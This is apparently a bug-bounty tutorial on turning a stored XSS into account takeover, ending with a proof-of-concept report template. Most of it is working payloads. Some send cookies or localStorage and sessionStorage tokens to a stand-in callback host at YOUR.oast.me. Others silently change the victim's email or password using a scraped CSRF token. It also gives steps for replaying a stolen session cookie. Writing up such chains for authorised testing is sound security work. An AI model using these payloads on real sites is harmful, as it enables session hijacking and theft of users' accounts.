XSS to Account Takeover
Why This Chain Works
Stored XSS gets triaged as medium because the reporter shows an alert box. That's not the report. The report is that your payload runs in the victim's browser with their session attached, and if their session cookie is readable from JavaScript - or their token lives in localStorage - you already have everything you need to authenticate as them. The cookie theft path is the obvious one. The storage-based path works even when HttpOnly is set.

Step-by-Step
1. Find a Stored XSS
Look for fields whose value is rendered back to other users: comments, profile bios, display names, message threads, ticket subjects, product reviews. The payload needs to reach a second user's browser - not just reflect back to yours.
Confirm execution with a safe callback:
<script>new Image().src='https://YOUR.oast.me/#039;+document.domain</script>
If you see the hit in Burp Collaborator or interactsh, you have stored XSS. Now build the chain.
2. Check Cookie Flags
Open DevTools on the target. Run document.cookie in the console. If your session cookie appears, HttpOnly is not set and the path is straightforward.
If document.cookie returns an empty string but you are clearly authenticated, HttpOnly is set. Move to Step 3.
3. Path A - Cookie Theft (No HttpOnly)
<script>
fetch('https://YOUR.oast.me/steal#039; + encodeURIComponent(document.cookie));
</script>
You receive the full cookie jar. Pull the session token from it. Set it in your browser using DevTools:
document.cookie = "session=VICTIM_TOKEN; domain=target.com; path=/";
Reload the page. You are now the victim.
4. Path B - Token in Storage (HttpOnly Set)
Many SPAs store bearer tokens in localStorage or sessionStorage rather than cookies. HttpOnly protects cookies, not storage.
<script>
var token = localStorage.getItem('auth_token')
           || localStorage.getItem('access_token')
           || sessionStorage.getItem('token');
fetch('https://YOUR.oast.me/steal#039; + encodeURIComponent(token));
</script>
Scan all keys if you don't know the name:
<script>
var data = {};
for (var i = 0; i < localStorage.length; i++) {
  var k = localStorage.key(i);
  data[k] = localStorage.getItem(k);
}
fetch('https://YOUR.oast.me/steal#039; + encodeURIComponent(JSON.stringify(data)));
</script>
Use the stolen bearer token directly in API calls.
5. Path C - CSRF-Adjacent Action (HttpOnly, No Token in Storage)
When you cannot read credentials directly, the XSS payload can act as the victim. Common actions:
Change email silently:
<script>
fetch('/api/account/email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json',
            'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').content},
  body: JSON.stringify({email: 'attacker@attacker.com'})
});
</script>
After the email changes, trigger a standard password reset to the attacker-controlled inbox.
Read anti-CSRF token and chain a state-change:
<script>
fetch('/settings').then(r => r.text()).then(html => {
  var token = html.match(/csrf.{0,20}value="([^"]+)"/)[1];
  return fetch('/account/password', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'password=Attacker123!&csrf=' + token
  });
});
</script>
6. Confirm ATO
Whether you replayed a cookie, used a bearer token, or forced an email change, confirm by loading the victim's profile page and showing account-specific data (name, order history, admin indicator) as proof.

PoC Template for Report
1. Stored XSS in profile bio field at /settings/profile
   Payload: <script>fetch('oast.me/#039;+encodeURIComponent(document.cookie))</script>
2. Victim (Account B) views attacker's profile at /user/attacker
3. Burp Collaborator receives: c=session=VICTIM_SESSION_VALUE
4. Attacker sets cookie in browser DevTools:
   document.cookie = "session=VICTIM_SESSION_VALUE; path=/"
5. Reload /dashboard - now authenticated as victim
6. Screenshot of victim's account dashboard showing their username and email attached.

Reporting Notes
The alert box is not the report. The report ends with a screenshot of the victim's account dashboard from the attacker's browser. Show the full chain: where the payload is stored, which endpoint the victim visits to trigger it, where the stolen credential arrives, and how you authenticate with it. Severity is determined by who can be the victim - if it fires on an admin page, that's critical regardless of the cookie-theft mechanism used.
